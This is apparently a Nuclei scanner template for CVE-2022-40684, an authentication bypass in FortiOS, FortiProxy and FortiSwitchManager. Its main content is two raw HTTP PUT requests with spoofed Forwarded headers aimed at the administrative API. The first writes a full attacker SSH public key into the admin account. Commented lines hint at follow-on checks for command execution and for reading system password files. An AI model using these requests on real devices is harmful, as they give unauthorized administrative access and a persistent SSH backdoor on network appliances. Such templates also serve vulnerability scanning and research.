id: CVE-2022-40684_51pwn

info:
  name: FortiOS Authentication Bypass
  author: 51pwn
  severity: Critical
  description: |
    An authentication bypass using an alternate path or channel vulnerability [CWE-288] in FortiOS, 
    FortiProxy and FortiSwitchManager may allow an unauthenticated atttacker to perform operations on 
    the administrative interface via specially crafted HTTP or HTTPS requests.
    port:5986 ssl:"cloudapp.net"
  reference:
    - https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/

  tags: bypass

requests:
  - raw:
      - |
        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
        X-Forwarded-For: {{Hostname}}
        Accept-Encoding: gzip
        Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;
        Connection: close
        User-Agent: Report Runner
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 444


        {"Ssh-public-key1":"\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001\""}

      # end
      - |
        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
        X-Forwarded-For: {{Hostname}}
        Accept-Encoding: gzip
        Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;
        Connection: close
        User-Agent: Report Runner
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 25


        {"Ssh-public-key1":"xxx"}

      # - |
      #   GET /rce/sshcheck?q={{Hostname}} HTTP/1.1
      #   Host: 127.0.0.1:9999
      #   Connection: close

    matchers-condition: or
    matchers: 
      - type: word
        words:
          - 'Invalid SSH public key.'
      # - type: regex
      #   regex:
      #     - uid=\d+\([^\)]+\).*gid=\d+\([^\)]+\).*group
      #     - root:x:0:0:root
      #   condition: or
      # - type: status
      #   status:
      #     - 200
        condition: and